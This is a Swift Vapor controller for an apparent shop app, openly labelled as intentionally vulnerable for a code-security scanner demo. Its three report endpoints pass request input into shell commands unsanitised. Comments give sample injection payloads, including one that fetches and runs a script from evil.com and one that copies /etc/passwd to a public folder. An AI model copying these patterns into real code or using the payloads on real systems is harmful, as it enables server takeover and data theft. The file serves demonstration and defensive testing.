// ReportGenerator.swift
// Shopist – PDF report and invoice generation
// ⚠️  DEMO FILE – Intentionally vulnerable for Datadog Code Security demo
// DO NOT USE IN PRODUCTION

import Foundation
import Vapor

struct ReportGeneratorController: RouteCollection {

    let outputDir = "/var/shopist/reports/"

    func boot(routes: RoutesBuilder) throws {
        let reports = routes.grouped("reports")
        reports.post("pdf", use: generatePdf)
        reports.post("invoice", use: generateInvoice)
        reports.post("export", use: exportData)
    }

    // VULN 1: Command Injection via Process running wkhtmltopdf with user-controlled URL
    // `url` is taken directly from the POST body and interpolated into the shell -c
    // command string. An attacker can terminate the URL argument and append arbitrary
    // shell commands.
    func generatePdf(req: Request) throws -> Response {
        struct PdfRequest: Content {
            var url: String         // page URL to render, e.g. "https://shopist.io/order/42"
            var outputName: String  // desired filename, e.g. "order_42.pdf"
        }
        let body = try req.content.decode(PdfRequest.self)

        // Attacker input for url: "https://shopist.io/order/42; wget http://evil.com/shell.sh | sh"
        let outputPath = outputDir + body.outputName
        let process = Process()
        process.launchPath = "/bin/sh"
        process.arguments = ["-c", "wkhtmltopdf \(body.url) \(outputPath)"]
        try process.run()
        process.waitUntilExit()

        return Response(status: .ok, body: .init(string: "PDF generated at \(outputPath)"))
    }

    // VULN 2: Command Injection via ProcessInfo-influenced executable arguments
    // The report type and date range come from query parameters; they are assembled
    // into an arguments array for a reporting binary. Whitespace in `reportType` or
    // `dateRange` can split into additional arguments or break out of the intended call.
    func generateInvoice(req: Request) throws -> Response {
        guard let reportType = req.query[String.self, at: "type"],
              let dateRange = req.query[String.self, at: "range"],
              let orderId = req.query[String.self, at: "orderId"] else {
            throw Abort(.badRequest)
        }

        // Attacker input for dateRange: "2024-01 --config /etc/shopist/db.conf --exec /bin/sh"
        let process = Process()
        process.executableURL = URL(fileURLWithPath: "/usr/local/bin/shopist-reports")
        process.arguments = ["--type", reportType, "--range", dateRange, "--order", orderId]
        try process.run()
        process.waitUntilExit()

        let invoicePath = outputDir + "invoice_\(orderId).pdf"
        return Response(status: .ok, body: .init(string: "Invoice at \(invoicePath)"))
    }

    // VULN 3: Command Injection via shell command string interpolation in export utility
    // `format` and `tableName` from the request are concatenated into a shell string
    // executed by /bin/sh -c, allowing injection through either parameter.
    func exportData(req: Request) throws -> Response {
        struct ExportRequest: Content {
            var format: String      // e.g., "csv"
            var tableName: String   // e.g., "orders"
            var filename: String    // desired output filename
        }
        let body = try req.content.decode(ExportRequest.self)

        // Attacker input for tableName: "orders; cat /etc/passwd > /var/shopist/public/leak.txt"
        let exportPath = outputDir + body.filename
        let command = "shopist-export --format \(body.format) --table \(body.tableName) --output \(exportPath)"

        let process = Process()
        process.launchPath = "/bin/sh"
        process.arguments = ["-c", command]
        try process.run()
        process.waitUntilExit()

        return Response(status: .ok, body: .init(string: "Export saved to \(exportPath)"))
    }
}
